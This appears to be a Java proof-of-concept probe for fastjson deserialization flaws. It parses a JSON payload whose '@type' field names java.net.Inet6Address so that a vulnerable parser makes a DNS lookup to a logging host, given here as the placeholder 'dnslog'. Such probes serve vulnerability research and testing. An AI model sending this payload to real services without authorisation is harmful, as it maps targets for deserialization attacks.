package com.security.bug.fastjson.dns;

import com.alibaba.fastjson.JSON;

/**

 */
public class Inet6AddressPoc {

    public static void main(String[] args) {
        String payload = "{\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"}";
        try {
            JSON.parse(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
